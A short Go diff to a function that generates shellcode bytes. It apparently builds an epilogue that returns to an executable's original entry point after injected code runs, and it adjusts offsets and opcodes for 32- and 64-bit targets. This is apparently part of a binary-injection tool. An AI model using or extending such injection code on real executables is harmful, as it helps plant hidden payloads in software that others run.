@@ -23,7 +23,7 @@ func modEpilogue(pSize int32, pEntry interface{}, oEntry interface{}) []byte {
 		0xc3, 								//ret
 	}
 	*/
-	var incOff uint32 = 0x12
+
 	encPsize := make([]byte, 4)
 	binary.LittleEndian.PutUint32(encPsize, uint32(pSize))
 	var numZeros uint32 = 0 
@@ -31,6 +31,14 @@ func modEpilogue(pSize int32, pEntry interface{}, oEntry interface{}) []byte {
 		if b != 0x00 {
 			numZeros++
 		}
+	}
+
+	var incOff uint32
+	switch pEntry.(type) {
+	case uint64:
+		incOff = 0x12 
+	case uint32:
+		incOff = 0xf
 	}
 	incOff += (numZeros - 1)
 
@@ -63,7 +71,7 @@ func modEpilogue(pSize int32, pEntry interface{}, oEntry interface{}) []byte {
 		shellcode.Write([]byte{0x48, 0x2d})
 	case uint32:
 		binary.LittleEndian.PutUint32(encPentry, v)
-		shellcode.Write([]byte{0x83, 0xe8})
+		shellcode.Write([]byte{0x2d})
 	}
 	shellcode.Write(encPentry)
 
